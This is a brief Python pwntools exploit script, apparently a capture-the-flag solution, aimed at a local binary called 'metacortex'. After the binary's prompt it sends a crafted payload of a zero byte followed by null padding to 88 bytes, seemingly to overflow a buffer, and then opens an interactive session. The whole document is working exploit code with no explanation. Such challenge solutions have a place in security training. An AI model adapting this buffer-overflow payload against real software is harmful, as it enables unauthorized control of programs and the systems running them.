from pwn import *

p = process('./metacortex')

p.recvuntil('Work for the respectable software company, Neo.')

payload = '0\x00' + '\x00' * (88 - 2)

p.sendline(payload)
p.interactive()
p.close()